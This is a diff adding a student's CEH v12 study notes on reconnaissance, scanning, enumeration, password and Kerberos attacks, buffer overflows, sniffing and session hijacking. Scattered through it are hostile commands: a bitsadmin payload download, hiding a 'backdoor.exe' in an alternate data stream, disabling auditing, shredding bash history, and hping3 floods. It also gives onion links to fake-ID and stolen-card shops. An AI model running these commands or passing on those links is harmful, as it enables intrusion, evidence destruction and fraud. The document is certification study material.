@@ -1,0 +1,2165 @@
+CEH v12
+Started 1 Dec 2022
+
+
+
+
+MODULE 01::
+
+Attacks = Motivve (goal) + Method + Vulnerability
+
+Passive Attacks - listening
+Active - risk of detection
+Close-in Attack : social engineering, evesdropping, shoulder surfing, dumpster diving
+Insider Attacks - user with priviliged access 
+Distribution attacks - supply chain
+
+Information warfare :: use of information of communication and technologies (ICT) to gain competitive advantages over an opponent.
+Defensive Information Warfare : refers to all strategies and actions designed to defend against attacks on ICT assets
+Offensive Information Warfare : attacks against the ICT assets of an opponent
+
+METHODOLOGY
+1. Footprinting
+2. Scanning
+3. Enumeration
+4. Vulnerability Analysis
+5. System Hacking
+	- Gaining access
+		Cracking passwords
+		Vulnerability Exploitation
+	- Escalating Privileges
+	- Maintaining Access
+		Executing Applications
+		Hiding Files
+	- Clearing Logs
+		Covering tracks
+
+CYBER KILL CHAIN METHODOLOGY 
+by Laugheed Martin
+".. is a component of intelligence-drive defense for the identification and prevention of malicious intrusion activities."
+"It provides greater insight into attack phases, which helps security professionals to understand the adversary's tactics, techniques and procedures beforehand."
+1. Reconaissance: gather data on target and probe for weak points
+2. Weaponization: create a deliverable maliscious payload using an exploit and a backdoor
+3. Delivery: send weaponized bundle to the victim using email, USB, etc
+4. Exploitation: exploit a vulnerability by executing code on the victim's system
+5. Installation: install malware on the target system
+6. Command and Control: create a C2 channel to communicate and pass data back and forth
+7. Actions on objectives: Perform actions to achieve intended objectives & goals
+
+TTPs: Tactics, Techniques and Procedures - patterns of activities and methods associated with specific threat actors or groups
+Tactics: guidelines that describe the way an attacker performs the attack from beginning to end
+	various tactics for information gathering to perform initial exploitation, escalation and lateral movement
+	tactics to deploy measures for persistent access
+Techniques: technical methods used by an attacker to achieve intermediate results during the attack	
+	includes initial exploitation, setting up and maintaining command and control channels, accessing infrastructure, covering tracks, exfiltration
+Procedures: organizational approaches that threat actors follow to launch an attack	
+	numer of actions usually differs depending on the objectives of the procedure and threat actor group
+
+MITRE ATT&CK FRAMEWORK
+- is a globally accessible knowledge base of adversary tactics and techniques based on real world observations
+- the ATT&CK knowledge base is used as a foundation for the development of specific threat models and methodologies in private sector, gov't and security product and service community
+- the 14 tactic categories within ATT&CK for Enterprise are derived from the later stages of the seven stages of the CYBER KILL CHAIN
+
+PRE-ATT&CK
+1. Recon
+2. Weaponize
+ENTERPRISE ATT&CK
+3. Deliver
+4. Exploit
+5. Control 
+6. Execute 
+7. Maintain
+
+DIAMOND MODEL OF INTRUSION ANALYSIS
+- framework for identifying the clusters of events that are correlated on any of the systems in an organization
+- can control the vital atomic element occuring in any intrusion activity which is referered to as the Diamond event
+- using this model efficient mitigation approaches can be developed and analytic efficiency can be increased
+WHO: is behind the attack ("Adversary")
+WHAT: the adversary used to reach the victim ("Infrastructure")
+WHERE: the attack was performed on the ("Victim")
+HOW: the attack was performed ("Capability")
+
+
+===================================================================================
+
+
+MODULE 02: Footprinting and Reconnaissance
+
+Footprinting: collecting information about a target network
+	Passive: gathering information without direct interaction (OSINT)
+	Active: gathering information with direct interaction
+	
+Information Obtained in Footprinting:
+1. Organization information
+	employee details
+	phone numbers
+	location details
+	background of the org
+	web technologies
+	news articles, press releases, etc
+2. Network Information
+	domain and sub domains
+	network blocks (IP ranges)
+	network topology, trusted routers, firewalls
+	whois records
+	dns records
+3. System Information
+	Webserver OS
+	location of web servers
+	publicly available email addresses
+	usernames and passwords
+
+Resources:
+Netcraft
+Google Hacking Database
+The Harvester tool to scrape social media
+Jobsites give up details of infrastructure
+SHODAN
+Emailtracker pro (track ip of where it was opened)
+Recon-ng
+FOCA
+OSRFramework
+https://mattw.io/youtube-metadata    # pulls all the metadata from a youtube video (wasn't working?)
+https://searchftps.net    # Napalm FTP indexer
+https://peekyou.com
+The Hidden Wiki :: http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion/wiki   
+Fake ID (Get fake IDs) :: http://ymvhtqya23wqpez63gyc3ke4svju3mqsby2awnhd3bk2e65izt7baqad.onion
+Cardshop (CCs with good balances) :: http://s57divisqlcjtsyutxjz2ww77vlbwpxgodtijcsrgsuts4js5hnxkhqd.onion
+ExoneraTor (search engine) :: https://metrics.torproject.org
+Onionland Search :: https://onionlandsearchengine.com
+Censys :: https://censys.io
+Sherlock.py
+
+
+
+Google Dorking strings:
+cache: This operator allows you to view cached version of the web page. [cache:www.eccouncil.org]- Query returns the cached version of the website www.eccouncil.org
+
+allinurl: This operator restricts results to pages containing all the query terms specified in the URL. [allinurl: EC-Council career]—Query returns only pages containing the words “EC-Council” and “career” in the URL
+
+inurl: This operator restricts the results to pages containing the word specified in the URL [inurl: copy site:www.eccouncil.org]—Query returns only pages in EC-Council site in which the URL has the word “copy”
+
+allintitle: This operator restricts results to pages containing all the query terms specified in the title. [allintitle: detect malware]—Query returns only pages containing the words “detect” and “malware” in the title
+
+inanchor: This operator restricts results to pages containing the query terms specified in the anchor text on links to the page. [Anti-virus inanchor:Norton]—Query returns only pages with anchor text on links to the pages containing the word “Norton” and the page containing the word “Anti-virus”
+
+allinanchor: This operator restricts results to pages containing all query terms specified in the anchor text on links to the page. [allinanchor: best cloud service provider]—Query returns only pages in which the anchor text on links to the pages contain the words “best,” “cloud,” “service,” and “provider”
+
+link: This operator searches websites or pages that contain links to the specified website or page. [link:www.eccouncil.org]—Finds pages that point to EC-Council’s home page
+
+related: This operator displays websites that are similar or related to the URL specified. [related:www.eccouncil.org]—Query provides the Google search engine results page with websites similar to eccouncil.org
+
+info: This operator finds information for the specified web page. [info:eccouncil.org]—Query provides information about the www.eccouncil.org home page
+
+location: This operator finds information for a specific location. [location: EC-Council]—Query give you results based around the term EC-Council
+
+
+
+===================================================================================
+
+MODULE 3 : SCANNING NETWORKS
+
+TCP Communication Flags:
+
+URG : (URGENT) Data contained in the packet shouuld be processed immediately
+PSH : (PUSH) Sends all buffered data immediately
+FIN : (FINISH) There will be no more transmissions
+ACK : (ACKNOWLEDGEMENT) Acknowledges the receipt of a packet
+RST : (RESET) Resets a connection
+SYN : (SYNCHRONIZE) Initiates a connection between hosts
+
+TCP Session Establishment (THREE WAY HANDSHAKE)
+1. >SYN : hello this address on this port, are you open
+2. <SYN + ACK : ok i'm open on this port
+3. >ACK, ACK :  ok thanks
+
+TCP Session Termination
+1. >FIN : i'm done with the data transfer
+2. <ACK ACK : Ok I received your termination request
+3. <FIN : I received all the data sent
+4. >ACK ACK : ok thanks
+
+ARP ping scans are most reliable
+*** NMAP SYNTAX ARE ON THE TEST ***
+- scan type, host discovery, timing options, aggressive, 
+NMAP SWITCHES:
+-A :: enable OS detection, version detection, script scanning, traceroute
+--traceroute :: enable traceroute
+--script or -sc  :: activates custom script scanning
+-s* :: uses ICMP echo, TCP SYN to port 443, TCP ACK to port 80, and ICMP timestamp request
+-sn  :: ping scan (skips port scanning)
+-sV  :: service/version detection
+-sO  :: IP protocol scan, not a port scan, lists supported IP protocols 
+-P*  :: ping options
+	-PS :: TCP SYN
+	-PA :: TCP ACK
+	-PR :: ARP
+	-PO :: IP protocol ping
+	-PE :: ICMP ping
+	-PU :: UDP ping
+	-Pn :: no ping (pingless scan), skips host discovery and treats all hosts as online
+-p-  :: scan all ports 1-65535
+-p:  :: scan only specified ports ie -p:U:53,111,T:21-25,80,139,8080
+-r	 :: scans ports consecutively (doesn't randomize)
+-O   :: OS fingerprinting
+--osscan-limit :: nmap won't try OS detection against hosts that don't have at least one open and one closed TCP port
+--fuzzy or --osscan-guess :: guess more aggressively
+-o*  :: output options
+	-oX :: XML output
+	-oG :: greppable
+-T* :: timing template
+	-T0 : paranoid
+	-T1 : sneakly
+	-T2 : polite
+	-T3 : normal/default
+	-T4 : aggressive
+	-T5 : insane
+-F  :: fast (limited port) scan, default does most common 1000 ports this does it to top 100
+-f  :: fragment the packets to avoid IDS signiture detection
+MAINS
+-sT :: TCP Connect/Full Open Scan: SYN packets, no root necessary, response SYN+ACK=port open or RST=port closed, easily detectable and filterable, logs disclose the connection
+-sS :: Single SYN packet : response same as full open but bypasses firewall rules and logging
+--(-sF, -sN, -sX) :: probe packet FIN/URG/PSH/NULL, if no response then port is open, if there is then port closed. Avoids IDS and logging (very stealth) / not effective against Windows hosts
+-sX :: Xmas scan, probe packet FIN+URG+PSH no response=port open, RST means port is closed. Avoids IDS and TCP 3way handsahek, only works against unix hosts (no windows hosts)
+-sF :: "FIN SCAN" probe packet fin is sent, if no response then port is open RST is port is closed (not against windows)
+-sN :: NULL scan - probe packet NULL .. no response=open, RST=closed (not against windows)
+-sM :: TCP Maimon Scan - probe packet FIN/ACK - no response port is open, ICMP unreachable error=port is filtered, RST=port closed (not against windows)
+EXTRAS
+-sA :: Ack Flag Probe packets, no response=port is filtered (stateful firewall present), RST=port not filtered
+-sA -ttl 100 :: TTL based ACK flag probe scan sends several thousand packets to different TCP ports .. RST=port open (ttl value on a port is < 64), RST TTL value >64 port is closed
+-sA -sW :: Windows based ACK flag probe - RST=port open (WINDOW value non-zero), ICMP unreachable = port filtered, RST=port closed (WINDOW value on port is zero)
+- Pn -p- -sl :: IDLE/IPID Header scan - syn packet probe, SYN+ACK=port open, RST=port closed, complete blind scanning of remote host
+-g or --sourceport  :: specify a port to send a ping through (ie 80 or 53 to get through a firewall)
+-D RND:10  :: IP address decoy scanning by using decoy addresses (in this case 10 random decoy addresses) .. obfuscates the source of the scan
+-iL  <list.txt>  ::  use a server list in txt format
+
+
+hping3 10.10.1.11 --udp --rand-source --data 500
+hping3 -S 10.10.1.11 -p 80 -c 5
+hping3 10.10.1.11 --flood
+	-synflood
+
+===================================================================================
+
+MODULE 4 : ENUMERATION
+
+Enumeration involves the attacker creating connections with a target system and performing directed queries to gain more information
+
+Attackers use the extracted information to identify points for a system attack and perform password attacks to gain unauthorized access
+
+Conducted in an internet environment
+
+Types of information enumerated ::
+- Network Resources
+- Network Shares
+- Routing Tables
+- Audit and service settings
+- SNMP and FQDN details
+- Machine names
+- Users and groups
+- Applications and banners
+
+Techniques for enumeration:
+1 - Extract usernames using email IDs
+2 - extract information using default passwords
+3 - brute forcing Active Directory (usually gets you locked out)
+4 - Extract information using DNS Zone Transfer
+5 - Extract user groups from Windows
+6 - Extract usernames using SNMP
+
+53 - DNS
+135 - MS RPC Endpoint mapper
+137 - NetBIOS name service (NBNS)
+139 - smb over netbios
+445 - SMB over TCP (direct host)
+161 - UDP SNMP
+389 - LDAP
+2049 - NFS
+25 - SMTP
+162 - SNMP Trap
+500 - UDP ISAKMP (internet security and key management protocol)/Internet Key Exchange (IKE)
+22 - SSH
+
+NetBIOS Enumeration:
+- a NetBIOS name is a unique 16 ASCII character string used to identify the network devices over TCP/IP; fifteen characters are used for device name and the 16th character is reserrved for the service or name record type
+nbtstat  -A ip.addr :: shows names and MAC ids
+nbtstat -c :: prints the cache to see recent connections/find nearby systems
+Netbios Enumerator :: windows util that maps the network out in windows gui
+nmap --script nbsta  :: note NOT with the T. Does the same thing
+
+Enumerating User Accounts:
+PsTools suite :: sysinternals tools
+psexec - executes processes remotely
+psfile - shows files opened remotely
+psgetsid - displays the sid of a computer user
+pskill - kills process by name or process id
+psinfo - lists info on a system
+pslist - list details about proceses
+psloggedon - shows who is logged on locally and via resource sharing
+psloglist - dumps even log records
+pspasswd - changes account passwords
+psshutdown - shuts down or reboots a computer
+
+Using PING on Windows to enumerate live targets on a subnet:
+	PING -n 1 192.168.50.2   | FIND /i "Reply"
+
+
+===================================================================================
+
+MODULE 6 : System Hacking
+
+Type 1 Password: Something I know
+Type 2 Password: Something I have 
+Type 3 Password: Something I am
+
+NTLM Authentication:
+NTLM Authentication Protocol 
+LM Authentication protocol (disabled since Vista)
+Both store the user's password in the SAM database using different hashing methods
+
+Kerberos Authentication:
+Default authentication for windows now
+Will fail back to NTLM 
+
+
+Security Accounts Manager Database (SAM)
+Windows SAM 
+located at c:\windows\system32\config\SAM
+
+CAIN can pull hashes from live registry, needs admin privs
+
+User submits password (hash) and receives a challenge based on their hash that's different every time
+User's client submits a challenge response (also hashed) and if they work then access granted
+This prevents replay attacks
+
+CAIN has a built in sniffer, can catch credentials on the fly (login to SMB for example) then pass to cracker
+
+Kerberos is more secure
+- the password hash is never sent across the network, just things which are encrypted with the password
+
+1. Client request to the Authentication Server (AS) - Key Distribution Center (KDC) for a Ticket Granting Ticket
+2. AS looks up username, reply to user request with TGT that's encrypted with user password
+	- TGT symmetric key information is unknown to an evesdropper
+3. Client reguest to the Ticket Granting Service (TGS) for a Service Ticket
+4. TGS reply to client request
+5. Client request to an Application Server to access a service 
+6. Application Server reply to prove it really is the server the client is expecting
+
+
+Types of Password Attacks:
+1. Non-electronic : (no technical knowledge) Shoulder surving, social engineering, dumpster diving
+2. Active Online Attacks : (cracking by directly communicating with victim machine) dictionary/bruteforcing/rule-based, trojan/spyware/keyloggers, password guessing/spraying, hash injection/mask attack, LLMNR/NBT-NS poisoning, cracking kerberos passwords, internal monologue attack
+3. Passive Online Attacks: (password cracking without communicating to the authorizing party) wire sniffing, MITM/on-path, replay
+4. Offline Attacks : (attacker cracks pw on own their own system) rainbow table attack, distributed network attack
+
+Rule based: creating passwords by manipulating existing words from a dictionary (eg password -> p4$$w0rD
+Spraying attack: targets multiple user accounts simultaneously to crack using a small set of commonly used passwords (use CrackMapExec to automate domain or workgroup members passwords)
+Mask attack: recovering passwords from hashes with a specific set of characters based on some information known to the attacker. (use hashcat)
+Credential Stuffing: using captured credentials from one location for another (hacked password from one website to try against gmail, fb, etc)
+
+Kerberos:
+AS-REP Roasting (Cracking TGT)
+	- attackers request TGT from KDC in the form of the AS-REQ packet and crack the ticket to obtains the user's password
+Kerberoasting (Cracking TGS)
+	- attackers request a TGS for the SPN of the target service account and crack the ticket to obtain the user's password
+Pass The Ticket Attack:
+	- used for authenticating a user to a system that is using the kerberos without providing the user's password
+	- to perform: attacker dumps kerberos tickets of legitimate accounts using CREDENTIAL DUMPING TOOLS (mimikatz)
+	- attacker then lauches a pass the ticket attack either by stealing the ST/TGT from an end-user machine, or by stealing the ST/TGT from a compromised AS
+	- attacker uses the retrieved ticket to gain unauthorized access to the target network services
+	- mimikatz, rubeus, windows credentials editor are used as tools
+	
+Distributed Network Attack (DNS attack)
+	- used for recovering passwords from the hashes or password-protected files using the unused processing power of machines across the network
+	- the DNA Manager is installed in a central location where machines running on DNA client can access it over the network
+	- the DNA Manager coordinates the attack and allocates small portions of the key search to machines that are distrubuted over the network
+	- the DNA client runs in the background consuming only unused processor time
+	
+BUFFER OVERFLOW:
+	- buffer is an area of adjacent memory locations allocated to a program or application to handle its runtime data
+	- buffer overflow or overrun is a common vulnerability in applications or programs that accepts more data than the allocated buffer
+	- this vulnerability allows the application to exceed the buffer while writing data to the buffer and overwrite neighboring memory locations
+	- attackers exploit buffer overflows to inject malicious code into the buffer to damange files, modify program data, access critical information, excalate privileges, gain a shell, etc
+	
+Why programs and apps are vulnerable to buffer overflows:
+	- lack of boundary checking
+	- using older versions of programming languages
+	- using unsafe vulnerable functions
+	- lack of good programming practices
+	- failing to set proper filtering and validation principles
+	- executing code present in the stack segment
+	- improper memory allocation
+	- insufficient input sanitization
+	
+Heap-Based Buffer Overflow:
+	- heap memory is dynamically allocated at runtime during the execution of the program and it stores program data
+	- heap-based overflow occurs when a block of memory is allocated to a heap and the data is written without any bounds checking
+	- this leads to overwriting dynamic object pointers, heap headers, heap-based data, virtual function table, tec
+	- attackers exploit heap-based buffer overflow to take control of the program's execution
+	- differs from stack overflows by being inconsistent and having different techniques
+
+Stack-Based Buffer Overflow:
+	- a stack is used for static memory allocation aand stores the variables in the "Last-in First out" (LIFO) order
+	- there are two stack operations: PUSH stores the data onto the stack and POP removes data from the stack
+	- if an app is vulnerable to stack-based buffer overflow then the attackers take control of the EIP (Extended Instruction Pointer) register to replace the return address of the function with the malicious code that allows them to gain shell access on the target system
+
+Steps to exploiting Windows based buffer overflow:
+1. Perform spiking
+	- allows attackers to send crafted TCP or UDP packets to the vulnerable server in order to make it crash
+	- helps attackers identify buffer overflow vulnerabilities in the target applications
+	1.1 : Establish connection with the vulnerable server using netcat
+	1.2 : Generate spike templates and perform spiking
+2. Perform fuzzing
+	- attackers use fuzzing to send a large amount of data to the target server so it experiences buffer overflow and overwrites the EIP register
+	- fuzzing helps identify the number of bytes required to crash the target server
+	- this information helps in determining the exact location of the EIP register, which helps in injecting malicious shellcode
+3. Identify the offset
+	- use Metasploit nattern_create and pathern_offset ruby tools to identify the offset and exact location where the EIP register is being overwritten
+4. Overwrite the EIP in register
+	- allows attackers to identify whether the EIP register can be controlled and can be overwritten with malicious shellcode
+5. Identify bad characters
+	- identify bad characters that may cause issues in the shellcode
+	- you can obtain the badchars through a google search. characters such as nobyte ie "\w00" arre badchars
+6. Identify the right module
+	- identifying the right module of the vulnerable server that lacks memory protection
+	- in Immunity Debugger you can use scripts such as mona.py to identify modules that lack memory protection
+7. Generate shellcode
+	- use msfvenom to generate the shellcode and inject it into the EIP register to gain  shell access to the target vulnerable server
+	- OllyDbg dynamically traces stack frames and program execution and it logs arguments of known functions
+8. Gain root access
+	- woot
+	
+Debuggers show you memory space that is being occupied by a process
+Disassemblers break down a compiled program into assembly
+
+Privilege Escalation Using DLL Hijacking:
+	- most windows apps do not use fully qualified path then loading an external DLL library, instead they search the directory from which they have been loaded
+	- if attackers can place a malicious DLL in the application directory, it will be executed in place of the real DLL
+	- attackers use tools such as Robber and PowerSploit to detect hijackable DLLs and perform DLL hijacking
+
+Tools for Executing Applications:
+	- Dameware Remote Support
+
+Spyware Tools:
+	- Spytech Spyagent
+	- Power Spy
+	
+Hiding data in NTFS Data Stream
+	- Alternate Data Stream (ADS) is a windows hidden stream which contains metadata for the file such as attributes, word count, author name and access, modification times, etc
+	- ADS can fork data into existing files without changing or altering their functionality, size or display to file browsing utilities
+	- ADS allows an attacker to inject malicious code in files on an accessible system and execute them without being detected by the user
+
+To create forked data attribute:
+	- notepad test.txt:hidden.txt
+	- : is magic filefork operator
+	- reopen it the same way
+	- dir /r    :: displays alternate data streams
+	- can do this with executables:
+	- type c:\path\to\executable.exe > c:\path\test.txt:maliciousexecutablefile.exe
+	- mklink backdoor.exe c:\path\test.txt:maliciousexecutablefile.exe
+	- needs admin
+	- can view hidden text:
+		- more < c:\path\hiddenfile.txt
+	
+Steganography:
+	- windows stego tool : INVISIBLE SECRETS 4 
+	- windows stego detector : xsteg
+	
+Golden Ticket attack:
+	- post exploitation technique implemented to gain complete control over the entire Active Directory (AD)
+	- attackers forget Ticket Granting Tickets (TGTs) by compromising a Key Distribution Service account (KRBTGT) to access various AD resources
+
+Silver Ticket Attack:
+	- steals legitimate users credentials and creates a fake Kerberos Ticket Granting Service (TGS) ticket
+	- to initiate this attack the attacker must have access to the credentials gathered from a local service account or the system's SAM database
+	- attacker creates a forged Kerberos TGS ticket using the mimikatz tool to establish a connection with the target service
+	
+Unquoted Service Path (windows)
+	If a service is created with an executable path that contains spaces and is not enclosed within quotes, then an unquoted service path vulnerability exists. In Windows, if the service is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument. If the service involved has SYSTEM privileges, an attacker could exploit this vulnerability and gain SYSTEM level access. This command finds the service name, executable path, the display name of the service, and auto starts in all the directories except C:\Windows\ (since by default there is no such service that has spaces and is unquoted in this folder).
+		c:\> wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """ 
+	
+COVERING TRACKS::
+1. Disable Auditing
+	- auditpol /set /category:"system","account logon" /success:disabled /failure:disable
+		- this disables the auditing
+	- auditpol /set /category:"system","account logon" /success:enable /failure:enable
+		- this re-enables it
+	- auditpol /get /category:"system","account logon"
+		- this displays the system audit policy
+2. Clearing Logs
+	- can be done from meterpreter
+	- windows manual: start > control panel > system and security > windows tools > event viewer > actions > clear
+	- linux manual : use text editor on /var/log//<filename.log>
+	- linux bash history:
+		- export HISTSIZE=0   :: disables history
+		- history -c   :: clears stored history
+		- history -w   :: clears history of the current shell
+		- cat /dev/null > ~.bash_history && history -c && exit   :: clearing users complete history
+		- shred ~/.bash_history  :: shreds it
+		- shread ~/.bash_history && cat /dev/null > .bash_history && history -c && exit   :: shreds the history file and clears the evidence of the 
+	- cipher.exe /w:C:\test     :: overwrites deleted files in a specific folder
+	- cipher.exe /w:C    :: overwrites entire drive
+3. Manipulating Logs
+4. Covering Tracks on Network/OS
+5. Deleting Files / Hiding Artifacts
+6. Disabling Windows Functionality
+
+Hiding user accounts in windows with registry key:
+Computer\HKEY_LOCAL|MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\Username1\Username2
+
+Other track covering tools:
+	- ccleaner, DBAN.org, Privacy Eraser (cybertronsoft.com), Wipe (privacyroot.com), BleachBit (bleachbit.org), CLearProg (clearprog.de)
+	
+User system monitor and surveillance using Spytech SpyAgent
+
+
+===================================================================================
+
+MODULE 7:
+
+First 48 bits of every frame on an ethernet network are the destination MAC 
+
+Passive Sniffing: only on HUB based networks (don't exist anymore)
+
+Active Sniffing: used to sniff on a switch-based network
+	- involves injecting ARP into the network to flood the switch's Content Adressable Memory (CAM) Table which keeps track of host-port connections
+	
+Techniques:
+	- MAC flooding
+	- DNS poisoning
+	- ARP poisoning
+	- DHCP attacks
+	- switch port stealing
+	- spoofing attack
+
+A SPAN port is a port on a switch that is configured to receive a copy of every packet that passes through a switch (mirror port)
+
+Active Wiretapping:
+	Monitors, records, alters and also injects data into the communication or traffic.
+	
+Passive Wiretapping
+	It only monitors and records the traffic and collects knowledge regarding the data it contains
+	
+MAC Flooding
+	involves flooding the Content Adressable Memory Table (CAM table) with fake MAC address and IP pairs until it is full
+	- the switch then acts as a hub by broadcasting packets to all machines on the network and therefor the attackers can sniff the traffic easily
+	- is noisy and easily flagged
+	tools: "macof" : needs 131,000 frames per minute
+		# macof -i eth0 -n 10 (or as many packets as you want to send)
+	- turn on port security on the switch kills this
+	
+Switch Port Stealing
+	- intermittent, non-persistent attack
+	- uses MAC flooding to sniff the packets
+	- flood the switch with forged gratuitous ARP packets with the target MAC address as the source and they own MAC address as the destination
+	- a race condition of the attacker's flooded packets and the target host's packets occurs
+		- the switch must therefor change its MAC address binding constantly between two different ports
+	- in such a case, if the attacker is fast enough they will be able to direct the packets intended for the target host toward their switch port
+	- the attacker now manages to steal the target host's switch port and sends ARP requests to the stolen switch port to discover the target host's IP address
+	- When the attacker gets an ARP reply this indicates that the target host's switch port binding has been restored and the attacker can now sniff the packets sent to the targeted host
+	
+Defence Against MAC Attacks
+	Port Security on Cisco Switch:
+	switchport port-security
+	switchport port-security maximum 1 vlan access
+	switchport port-security violation restrict
+	switchport port-security aging time 2
+	switchport port-security aging type inactivity
+	switchport port-security traps port-security trap-rate 5
+	
+DHCP Starvation Attack
+	- is a DOS attack on the DHCP server and the attacker broadcasts forged DHCP requests and tries to lease all the DHCP addresses available in the DHCP scope
+	- therefor the legitimate user is unable to obtain or renew an IP address requested via DHCP and fails to get access to the network
+	4 Step Handshake: Discover, Offer, Request, Acknowledgement
+	Tools: yersinia, dhcpstarvation.py (github), Hyenae (sourceforge), dhcpstarv (github), gobbler (sourceforge)
+	- Can be killed by port security
+		- also shut down by DHCP snooping (which specifies which port the DHCP server is on)
+	# yersinia -I (must be root and interactive)
+		"h" for help screen
+		F2 for DHCP mode
+		then "x" for all available attack options
+		then "1" for a starvation attack
+		GOES ON BLAST DON'T RUN IT FOR LONG
+		
+Rogue DHCP Server Attack
+	- attacker setups up a rogue DHCP server on the network and responds to the requests with bogus IP addresses resulting in compromised network access
+	- the attack works in conjunction with the DHCP starvation attack
+		- the attacker sends TCP/IP setting to the user after knocking them out from their genuine DHCP server
+	This sets up other attacks:
+		Provide Wrong Gateway, sets up MITM
+		Provide wrong DNS, sets up DNS poisoning
+	
+ARP Spoofing Attack (ARP Poisoning)
+	- ARP is a stateless protocol used for resolving IP addresses to machine MAC addresses
+	- ARP packets can be forged to send data to the attacker's machine
+	- ARP spoofing involves constructing many forged ARP requests and reply packets to overload the switch
+	- the switch is set in "formwarding mode" after the ARP table is flooded with spoofed ARP replies and attackers can then sniff all the network packets
+	- attackers flood a target computer's ARP cache with forged entries which is known as posoning
+	ARP table times out in 2 minutes in windows and 5 minutes in everything else
+		"Gratuitous Arp Request" (or "Unsolicited") : you don't have to ask to be told what the MAC is, you can just push it out and it will update the ARP table
+	tools: cain (windows), arpspoof, habu, bettercap, ettercap, dsniff, mitmf, arpoison
+	
+VLAN Hopping
+	- technique used to target network resources present on a virtual lan
+	- can be performed by using two primary methods:
+		- switch spoofing
+			- attackers connect a rogue switch onto the network by tricking a legitimate switch and thereby creating a trunk link between them
+		- double tagging
+			- attackers add and modify tags in the ethernet frame thereby allowing the flow of traffic through any vlan in the network
+		- STP (Spanning Tree Protocol) Attack
+			- attackers connect a rogue switch into the network to change the operations of the STP and sniff all the network traffic
+			- attackers configure the rogue switch such that its priority is less than that of any other switch in the network, which makes it the root bridge, thus allowing the attackers to sniff all the traffic flowing in the network			
+	- attackers perform vlan hopping attacks to steal sensitive information such as pws, modify or corrupt/delete data, install malicious code or programs, etc
+	
+DNS Poisoning Techniques
+	- a technique that tricks a DNS server into believing that it has received authentic information when it has not received any
+	- results in the substitution of a false IP address at the DNS level where the web addresses are converted into numeric IP addresses
+Intranet DNS Spoofing
+	- the attacker's system must be connected to the LAN and be able to sniff packets
+	- works well against switches with ARP poison routing
+Internet DNS Poisoning
+	- modifying the hosts file
+Proxy Server DNS Poisoning
+	- attacker sends a Trojan to the victim that changes his proxy server settings to that of the attacker and redirects to the fake website
+DNS Cache Poisoning
+	- altering or adding forged DNS records into the DNS resolver cache so that a DNS query is redirected to a malicious site
+	- if the DNS resolver cannot validate that the DNS responses have been received from an authoritative source it will cache the incorrect entries locally and serve them to users who make a similar request
+
+You can detect sniffing by detecting NICs in promiscuous mode by misaddressing ICMP to them (ping) and then seeing if it replies. 
+# nmap --script sniffer-detect 10.10.10.10
+	
+	
+wireshark filter:
+http.request.method==POST  
+	- will find passwords sent over POST
+	- set it to Narrow UTF-8ASCII
+	- expand HTML Form URL Encoded in the packet
+
+Enable Remote Packet Capture Service on Windows then add it as a remote interface in wireshark (needs creds) 
+
+Bypass Windows firewall by using bitsadmin in powershell to transfer a payload from a webserver:
+PS > bitsadmin /transfer Filenametosaveas.exe http://10.10.1.23/share/sourcefilename.exe c:\filename.exe
+
+
+
+MITM is used to intrude into an existing connection
+	- cloning cookies / session IDs
+	- attackers use different techniques to split the TCP connection 
+		- client to attacker connection
+		- attacker to server connection
+	- after the interception of the tcp connection an attacker can read, modify and insert fraudulent data into the intercepted communication
+	- in the case of an http transaction the tcp connection between the client and the server becomes the target
+
+Man/Manipulator in the Browser attack
+	- uses a trojan horse to intercept the calls between the browser and its security mechanisms or libraries
+	- it works with an already installed trojan that acts between the browser and the security mechanisms
+	- main objective is to cause financial deceptions by manipulatiing transactions of internet banking systems
+
+	 
+Compromising Session IDS Using Client-side Attacks
+	- XSS enables attackers to inject malicious client-side scripts into the web pages viewed by other users
+	- malicious javascript codes can be embedded ina web page that does not generate any warning but it captures session tokens in the background and sends them to the attacker
+	- a trojan horse can change the proxy settings in the user's browser to send all sessions through the attackers machine
+	
+In a session replay attack thet attacker listens to the conversation between the user and the server and captures the authentication token of the user
+	- once the authentication token is captured the attacker replays the request to the server with the captured authentication token and gains unauthorized acess to the server
+
+Network-Level Session Hijacking
+	- relies on hijacking transport and IP used by web apps in the application layer
+	- the attacker gains critical information by attacking the network level sessions
+	
+Includes:
+	- Blind hijacking
+		- an attacker can inject malicious data or commands into the intercepted communications in the TCP session even if the source routing is disabled
+		- attacker can send the data or commands but has no access to see the response.		
+	- UDP hijacking
+		- a network-level session hijacking where the attacker sends forged server reply to a victim's UDP request before the intended server replies to it
+		- the attacker uses a MITM attack to intercept the server's response to the client and sends a forged reply
+	- TCP/IP hijacking
+		- involves using spoofed packets to seize control of a connection between victim & target
+		- a victim's connection hangs and an attacker is then able to communicate with the host's machine as if they're the victim
+		- to launch TCP/IP hijack you must be on the same network as the victim
+			- trying to guess the sequence numbers is a 4.2billion range (never happen)
+		- target server can be located anywhere
+	- RST hijacking
+		- involves injecting an authentic-looking RST packet using a spoofed source address and predicting the ACK number
+		- a hacker can reset a victim's connection if it uses an accurate acknowledgement number
+		- the victim would believe that the source sent the reset packet and resets the connection
+		- RST hijacking can be performed using a packet frafting tool such as Colasoft Packet builder and TCP/IP analysis tools like tcpdump
+	- MITM (packet sniffing)
+	- IP spoofing (source routed packets)
+		1. The packet source routing technique is used for gaining unauthorized access to a computer with the help of a trusted host's IP address
+		2. An attacker spoofs the host's IP address so that the server managing a session with the host accepts the packets from the attacker
+		3. When the session is established, the attacker injects forged packets before the host responds to the server
+		4. The original packet from the host is lost as the server receives the packet with a sequence number already used by the attacker
+		5. The packets from the attacker are source-routed through the host with the destination IP specificed by the attacker.
+		
+Session Hijacking Tools:
+1. OWASP ZAP
+	- integrated pentesting tool for finding vulnerabilities in web apps
+2. Burp Suite (portswigger.net)
+3. Netool Tookit (sourceforge.net)
+4. WebSploit Framework (sourceforge.net)
+5. SSLStrrip (pypi.python.org)
+6. JHijack (sourceforge.net)
+
+Preventing Session Hijacking
+1. HTTP Strict Transport Security (HSTS)
+	- web security policy that protects HTTPS websites against MITM
+	- allows web servers to enforce web browsers to interact with it using secure HTTPS
+2. Token Binding
+	- when a user logs on to a web app it generates a cookie with a SID called a token
+	- token binding protects client-server communications against session hijacking
+3. HTTP Public Key Pinning (HPKP)
+	- is a "Trust on First Use" (TOFU) technique used in an HTTP header
+	- HPKP allos a web client to associate a specific public key certificate with a particular server to minimize the risk of MITM
+	
+	
